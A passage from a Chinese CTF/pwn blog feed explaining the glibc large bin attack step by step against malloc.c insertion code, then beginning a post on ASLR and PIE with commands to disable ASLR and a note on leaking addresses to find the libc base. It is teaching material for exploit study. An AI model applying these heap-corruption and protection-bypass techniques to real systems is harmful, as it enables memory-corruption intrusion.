data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">while</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span><span class=\"token punctuation\">)</span> size<span class=\"token operator\">&lt;</span> fwd<span class=\"token operator\">-></span>size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span> <span class=\"token comment\">// 这里 size 为新插入的，fwd 为已经在 largebin 中的 前一个刚释放  的 chunk</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\tfwd<span class=\"token operator\">=</span>fwd<span class=\"token operator\">-></span>fd_nextsize<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t<span class=\"token function\">assert</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>fwd<span class=\"token operator\">-></span>size <span class=\"token operator\">&amp;</span> NON_MAIN_ARENA<span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>在 largebin 中的 chunk 如果 <code>index相同</code> 的情况下，是按照从小到大的顺序排列的，也就是说在 index 相同的情况下 size 越小的 chunk，越接近 largebin (fd 指向 largebin, 与图对应)，上面的代码是比较 <code>新插入</code> 的 chunk 的 size (size) 是否 <code>小于</code> 上一个刚释放进入 <code>largebin</code>  中的 chunk 的 size (fwd_size) 的过程</p>\n<p>当小于成立时，执行 while 中的流程；不成立时，判断：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span><span class=\"token punctuation\">)</span> size <span class=\"token operator\">==</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span><span class=\"token punctuation\">)</span> fwd<span class=\"token operator\">-></span>size<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\">//Always insert in the second position</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\tfwd<span class=\"token operator\">=</span>fwd<span class=\"token operator\">-></span>fd<span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>上面的这个对我们来说无法利用，接下来判断大于时：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">else</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t  victim<span class=\"token operator\">-></span>fd_nextsize <span class=\"token operator\">=</span> fwd<span class=\"token punctuation\">;</span>                     <span class=\"token comment\">//victim 是当前新插入的 chunk</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t  victim<span class=\"token operator\">-></span>bk_nextsize <span class=\"token operator\">=</span> fwd<span class=\"token operator\">-></span>bk_nextsize<span class=\"token punctuation\">;</span> <span class=\"token comment\">//fwd 是前一个释放的 chunk</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t  fwd<span class=\"token operator\">-></span>bk_nextsize <span class=\"token operator\">=</span> victim<span class=\"token punctuation\">;</span><span class=\"token comment\">// 将前一个释放的 bk_nextsize 指向新的 chunk</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t  victim<span class=\"token operator\">-></span>bk_nextsize<span class=\"token operator\">-></span>fd_nextsize <span class=\"token operator\">=</span> victim<span class=\"token punctuation\">;</span><span class=\"token comment\">// 修改新的 chunk 的上一个大小不相同的 chunk 的 fd_nextsize 指向自己</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\tbck <span class=\"token operator\">=</span> fwd <span class=\"token operator\">-></span>bk<span class=\"token punctuation\">;</span> <span class=\"token comment\">//bck 为上一个释放的 chunk 的 bk</span></pre></td></tr></table></figure><p>上面这一段我们可以进行利用，当我们对 fwd 的内容进行修改后，改变其 <code>bk</code>  和 <code>bk_nextsize</code>  的指向然后在执行上面这一段代码就会将一些值改变：</p>\n<p>1. 选择两个地址为我们想要修改的 <code>值</code> 的地址：</p>\n<pre><code>这里选择stack1和stack2\n</code></pre>\n<p>2. 然后修改 fwd 的值 (fwd 为上一个释放的 <code>large_chunk</code> ):</p>\n<p><img data-src=\"https://z1.ax1x.com/2023/10/07/pPjaDqf.png\" alt=\"\" /></p>\n<p>3. 修改完后就会变成如下情况：</p>\n<p><img data-src=\"https://z1.ax1x.com/2023/10/07/pPjaoZT.png\" alt=\"\" /></p>\n<p>4. 再当执行上面判断大小结果为大于的时候的代码时：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">else</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t  victim<span class=\"token operator\">-></span>fd_nextsize <span class=\"token operator\">=</span> fwd<span class=\"token punctuation\">;</span>                     <span class=\"token comment\">//victim 是当前新插入的 chunk</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t  victim<span class=\"token operator\">-></span>bk_nextsize <span class=\"token operator\">=</span> fwd<span class=\"token operator\">-></span>bk_nextsize<span class=\"token punctuation\">;</span> <span class=\"token comment\">//fwd 是前一个释放的 chunk</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t  fwd<span class=\"token operator\">-></span>bk_nextsize <span class=\"token operator\">=</span> victim<span class=\"token punctuation\">;</span><span class=\"token comment\">// 将前一个释放的 bk_nextsize 指向新的 chunk</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t  victim<span class=\"token operator\">-></span>bk_nextsize<span class=\"token operator\">-></span>fd_nextsize <span class=\"token operator\">=</span> victim<span class=\"token punctuation\">;</span><span class=\"token comment\">// 修改新的 chunk 的上一个大小不相同的 chunk 的 fd_nextsize 指向自己</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\tbck <span class=\"token operator\">=</span> fwd <span class=\"token operator\">-></span>bk<span class=\"token punctuation\">;</span> <span class=\"token comment\">//bck 为上一个释放的 chunk 的 bk</span></pre></td></tr></table></figure><p>将 victim 插入时发现</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>victim<span class=\"token operator\">-></span>bk_nextsize<span class=\"token operator\">-></span>fd_nextsize <span class=\"token operator\">=</span> victim<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\">//victim-bk_nextsize 已经指向了 fake_chunk2</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">// 这里就将 fake_chunk2 的 fd_nextsize 的值变为了 victim 的地址，也就将 stack2 原来的值变为了 victim 的地址</span></pre></td></tr></table></figure><p>5. 修改 stack1 的值</p>\n<p>在执行完对 <code>victim</code>  和 <code>fwd</code>  的 <code>fd_nextsize</code>  和 <code>bk_nextsize</code>  的修改后，会继续对他俩的 <code>fd</code>  和 <code>bk</code>  修改</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">mark_bin</span><span class=\"token punctuation\">(</span>av<span class=\"token punctuation\">,</span>victim_index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>victim<span class=\"token operator\">-></span>bk <span class=\"token operator\">=</span> bck<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>victim<span class=\"token operator\">-></span>fd <span class=\"token operator\">=</span> fwd<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>fwd<span class=\"token operator\">-></span>bk <span class=\"token operator\">=</span> victim<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>bck<span class=\"token operator\">-></span>fd <span class=\"token operator\">=</span> victim<span class=\"token punctuation\">;</span>  <span class=\"token comment\">//bck 为 fwd 的 bk 指针</span></pre></td></tr></table></figure><p>这里会发现：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>bck<span class=\"token operator\">-></span>fd <span class=\"token operator\">=</span> victim<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\">// 这里 bck = fwd -> bk</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">// 也就等于 fwd->bk->fd = victim</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\">// 就将 fack_chunk1 的 stack（fd）的值改为了 victim 的地址</span></pre></td></tr></table></figure><p>最后我们就将</p>\n<p>fake_chunk1 的 fd（stack1）的值改为了 victim 的地址<br />\n fake_chunk2 的 fd（stack2）的值改为了 victim 的地址</p>\n<h1 id=\"large-bin的利用条件\"><a class=\"anchor\" href=\"#large-bin的利用条件\">#</a> Large bin 的利用条件：</h1>\n<ul>\n<li>可以修改一个 <code>large bin chunk</code>  的 data 域（fwd 的 bk 和 bk_nextsize）</li>\n<li>从 <code>unsorted bin</code>  中来的 <code>large bin chunk</code> （victim）要紧跟在 <code>被构造</code> 过的 chunk (fwd) 后面【为了判断大小时能够插入到正确的地方】</li>\n</ul>\n<h1 id=\"在mallocc中从unsorted-bin去将chunk放入对应的binlarge-bin的完整代码\"><a class=\"anchor\" href=\"#在mallocc中从unsorted-bin去将chunk放入对应的binlarge-bin的完整代码\">#</a> 在 malloc.c 中从 unsorted bin 去将 chunk 放入对应的 bin（large bin）的完整代码：</h1>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">/* remove from unsorted list */</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>          <span class=\"token function\">unsorted_chunks</span> <span class=\"token punctuation\">(</span>av<span class=\"token punctuation\">)</span><span class=\"token operator\">-></span>bk <span class=\"token operator\">=</span> bck<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>          bck<span class=\"token operator\">-></span>fd <span class=\"token operator\">=</span> <span class=\"token function\">unsorted_chunks</span> <span class=\"token punctuation\">(</span>av<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>          <span class=\"token comment\">/* Take now instead of binning if exact fit */</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>          <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>size <span class=\"token operator\">==</span> nb<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>            <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>              <span class=\"token function\">set_inuse_bit_at_offset</span> <span class=\"token punctuation\">(</span>victim<span class=\"token punctuation\">,</span> size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>              <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>av <span class=\"token operator\">!=</span> <span class=\"token operator\">&amp;</span>main_arena<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>                victim<span class=\"token operator\">-></span>size <span class=\"token operator\">|=</span> NON_MAIN_ARENA<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>              <span class=\"token function\">check_malloced_chunk</span> <span class=\"token punctuation\">(</span>av<span class=\"token punctuation\">,</span> victim<span class=\"token punctuation\">,</span> nb<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>              <span class=\"token keyword\">void</span> <span class=\"token operator\">*</span>p <span class=\"token operator\">=</span> <span class=\"token function\">chunk2mem</span> <span class=\"token punctuation\">(</span>victim<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>              <span class=\"token function\">alloc_perturb</span> <span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span> bytes<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>              <span class=\"token keyword\">return</span> p<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>          <span class=\"token comment\">/* place chunk in bin */</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>          <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">in_smallbin_range</span> <span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>            <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>              victim_index <span class=\"token operator\">=</span> <span class=\"token function\">smallbin_index</span> <span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>              bck <span class=\"token operator\">=</span> <span class=\"token function\">bin_at</span> <span class=\"token punctuation\">(</span>av<span class=\"token punctuation\">,</span> victim_index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>              fwd <span class=\"token operator\">=</span> bck<span class=\"token operator\">-></span>fd<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>          <span class=\"token keyword\">else</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>            <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>              victim_index <span class=\"token operator\">=</span> <span class=\"token function\">largebin_index</span> <span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>              bck <span class=\"token operator\">=</span> <span class=\"token function\">bin_at</span> <span class=\"token punctuation\">(</span>av<span class=\"token punctuation\">,</span> victim_index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>              fwd <span class=\"token operator\">=</span> bck<span class=\"token operator\">-></span>fd<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>              <span class=\"token comment\">/* maintain large bins in sorted order */</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>              <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>fwd <span class=\"token operator\">!=</span> bck<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>                <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>                  <span class=\"token comment\">/* Or with inuse bit to speed comparisons */</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>                  size <span class=\"token operator\">|=</span> PREV_INUSE<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>                  <span class=\"token comment\">/* if smaller than smallest, bypass loop below */</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>                  <span class=\"token function\">assert</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>bck<span class=\"token operator\">-></span>bk<span class=\"token operator\">-></span>size <span class=\"token operator\">&amp;</span> NON_MAIN_ARENA<span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>                  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">(</span>bck<span class=\"token operator\">-></span>bk<span class=\"token operator\">-></span>size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>                    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>                      fwd <span class=\"token operator\">=</span> bck<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>                      bck <span class=\"token operator\">=</span> bck<span class=\"token operator\">-></span>bk<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>                      victim<span class=\"token operator\">-></span>fd_nextsize <span class=\"token operator\">=</span> fwd<span class=\"token operator\">-></span>fd<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>                      victim<span class=\"token operator\">-></span>bk_nextsize <span class=\"token operator\">=</span> fwd<span class=\"token operator\">-></span>fd<span class=\"token operator\">-></span>bk_nextsize<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>                      fwd<span class=\"token operator\">-></span>fd<span class=\"token operator\">-></span>bk_nextsize <span class=\"token operator\">=</span> victim<span class=\"token operator\">-></span>bk_nextsize<span class=\"token operator\">-></span>fd_nextsize <span class=\"token operator\">=</span> victim<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>                    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>                  <span class=\"token keyword\">else</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>                    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>                      <span class=\"token function\">assert</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>fwd<span class=\"token operator\">-></span>size <span class=\"token operator\">&amp;</span> NON_MAIN_ARENA<span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>                      <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span><span class=\"token punctuation\">)</span> size <span class=\"token operator\">&lt;</span> fwd<span class=\"token operator\">-></span>size<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>                        <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>                          fwd <span class=\"token operator\">=</span> fwd<span class=\"token operator\">-></span>fd_nextsize<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>                          <span class=\"token function\">assert</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>fwd<span class=\"token operator\">-></span>size <span class=\"token operator\">&amp;</span> NON_MAIN_ARENA<span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>                        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>                      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span><span class=\"token punctuation\">)</span> size <span class=\"token operator\">==</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span><span class=\"token punctuation\">)</span> fwd<span class=\"token operator\">-></span>size<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>                        <span class=\"token comment\">/* Always insert in the second position.  */</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>                        fwd <span class=\"token operator\">=</span> fwd<span class=\"token operator\">-></span>fd<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>                      <span class=\"token keyword\">else</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>                        <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>                          victim<span class=\"token operator\">-></span>fd_nextsize <span class=\"token operator\">=</span> fwd<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>                          victim<span class=\"token operator\">-></span>bk_nextsize <span class=\"token operator\">=</span> fwd<span class=\"token operator\">-></span>bk_nextsize<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>                          fwd<span class=\"token operator\">-></span>bk_nextsize <span class=\"token operator\">=</span> victim<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>                          victim<span class=\"token operator\">-></span>bk_nextsize<span class=\"token operator\">-></span>fd_nextsize <span class=\"token operator\">=</span> victim<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>                        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>                      bck <span class=\"token operator\">=</span> fwd<span class=\"token operator\">-></span>bk<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>                    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>                <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre>              <span class=\"token keyword\">else</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre>                victim<span class=\"token operator\">-></span>fd_nextsize <span class=\"token operator\">=</span> victim<span class=\"token operator\">-></span>bk_nextsize <span class=\"token operator\">=</span> victim<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre></pre></td></tr><tr><td data-num=\"74\"></td><td><pre>          <span class=\"token function\">mark_bin</span> <span class=\"token punctuation\">(</span>av<span class=\"token punctuation\">,</span> victim_index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre>          victim<span class=\"token operator\">-></span>bk <span class=\"token operator\">=</span> bck<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"76\"></td><td><pre>          victim<span class=\"token operator\">-></span>fd <span class=\"token operator\">=</span> fwd<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"77\"></td><td><pre>          fwd<span class=\"token operator\">-></span>bk <span class=\"token operator\">=</span> victim<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"78\"></td><td><pre>          bck<span class=\"token operator\">-></span>fd <span class=\"token operator\">=</span> victim<span class=\"token punctuation\">;</span></pre></td></tr></table></figure>",
            "tags": [
                "pwn",
                "Linux"
            ]
        },
        {
            "id": "https://vvwwvv.cn/2023/10/04/Linux/ASLR%E4%B8%8EPIE/",
            "url": "https://vvwwvv.cn/2023/10/04/Linux/ASLR%E4%B8%8EPIE/",
            "title": "ASLR与PIE（例题：CTFshow的pwn31）",
            "date_published": "2023-10-04T06:15:56.000Z",
            "content_html": "<h1 id=\"前言\"><a class=\"anchor\" href=\"#前言\">#</a> 前言</h1>\n<p><code>ASLR</code>  与 <code>PIE</code>  是不同的，两者不能认为是同一个机制，但是他们都是对地址进行 <code>随机化</code> ，只不过作用的 <code>对象</code> 和作用 <code>时期</code> 不太一样</p>\n<h1 id=\"1aslr操作系统的功能\"><a class=\"anchor\" href=\"#1aslr操作系统的功能\">#</a> 1.ASLR (操作系统的功能)：</h1>\n<p>ASLR 是 <code>Linux操作系统</code> 的功能选项，作用于程序 (ELF) 装入 <code>内存</code> 运行时。是一种针对缓冲区溢出的安全保护技术，通过对加载地址的随机化，防止攻击者直接定位攻击代码位置，到达阻止溢出攻击的一种技术。</p>\n<h2 id=\"打开关闭aslr\"><a class=\"anchor\" href=\"#打开关闭aslr\">#</a> 打开 / 关闭 ASLR：</h2>\n<h3 id=\"查看aslr打开情况\"><a class=\"anchor\" href=\"#查看aslr打开情况\">#</a> 查看 ASLR 打开情况：</h3>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"><span>l</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">sudo</span> <span class=\"token function\">cat</span> /proc/sys/kernel/randomize_va_space</pre></td></tr></table></figure><h3 id=\"关闭alsr\"><a class=\"anchor\" href=\"#关闭alsr\">#</a> 关闭 ALSR</h3>\n<p>1. 手动修改（长期生效）：</p>\n<p>修改的是 randomize_va_space 文件的枚举值，设置的值不同，linux 内核加载程序的地址空间的策略就会不同</p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"><span>l</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\"># echo 0 > /proc/sys/kernel/randomize_va_space</span></pre></td></tr></table></figure><p>2. 利用 sysctl 控制 ASLR (临时有效，重启后复原):</p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"><span>l</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>$ <span class=\"token function\">sysctl</span> <span class=\"token parameter variable\">-w</span> <span class=\"token assign-left variable\">kernel.randomize_va_space</span><span class=\"token operator\">=</span><span class=\"token number\">0</span></pre></td></tr></table></figure><p>3. 利用 setarch 控制单独程序的随机化：</p>\n<p>如果你想历史关闭单个程序的 ASLR，使用 setarch 是很好的选择。setarch 命令如其名，改变程序的运行架构环境，并可以自定义环境 flag。</p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"><span>l</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>setarch <span class=\"token variable\"><span class=\"token variable\">`</span><span class=\"token function\">uname</span> <span class=\"token parameter variable\">-m</span><span class=\"token variable\">`</span></span> <span class=\"token parameter variable\">-R</span> ./your_program</pre></td></tr></table></figure><pre><code>R参数代表关闭地址空间随机化（开启ADDR_NO_RANDOMIZE)\n</code></pre>\n<p>4.gbd 中关闭和开启：</p>\n<p>在调试特定程序时，可以通过 set disable-randomization 命令开启或者关闭地址空间随机化。默认是关闭随机化的，也就是 on 状态</p>\n<pre><code>关闭ASLR：\nset disable-randomization on\n开启ASLR：\nset disable-randomization off\n查看ASLR状态：\nshow disable-randomization\n</code></pre>\n<h2 id=\"aslr保护\"><a class=\"anchor\" href=\"#aslr保护\">#</a> ASLR 保护：</h2>\n<p>Linux 下的 ASLR 总共有三个级别： <code>0、1、2</code></p>\n<pre><code>0：关闭ASLR，没有进行随机化，堆栈基地址每次都相同，并且libc.so每次的地址也相同。\n1：普通的ASLR。mmap基地址、栈基地址、.so加载基地址（共享库（.so\\libraries））都将被随机化；但是堆没有随机化\n2：在1的基础上加上了堆基地址的随机化\n</code></pre>\n<h1 id=\"2pie编译器的功能\"><a class=\"anchor\" href=\"#2pie编译器的功能\">#</a> 2.PIE（编译器的功能）:</h1>\n<p>PIE 叫做代码部分地址无关，PIE 是我们在编译（gcc）时可以选择的功能，作用于程序（ELF）编译过程。其针对的是代码段（.text）, 数据段（.data），为初始化全局变量 (.bbs) 等固定地址的防护，程序在开启了 pie 时，每次加载程序都会时程序的加载地址改变</p>\n<h2 id=\"开启pie\"><a class=\"anchor\" href=\"#开启pie\">#</a> 开启 PIE:</h2>\n<p>在使用 gcc 编译时加入命令参数   <code>-fPIE</code></p>\n<h1 id=\"3开启aslrpie\"><a class=\"anchor\" href=\"#3开启aslrpie\">#</a> 3. 开启 ASLR+PIE:</h1>\n<p>开启 <code>ASLR+PIE</code>  的一个直接的困扰就是，你会发现没有地方可以写，所有的 got 表、plt 表、bss 段地址都是不确定的。只有通过泄漏才可以确定地址，所以我们想利用时，必须先泄露函数的地址然后算出 libc 的基址才行。</p>\n<p>【注意】</p>\n<p>由于 PIE 将代码地址随机化了，我们就不能够直接通过 EFL 来获取 got 表和 plt 表等的地址，需要加上一个固定的偏移量，例如：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>base<span class=\"token operator\">=</span>main<span class=\"token operator\">-</span>e<span class=\"token punctuation\">.</span>symbols<span class=\"token 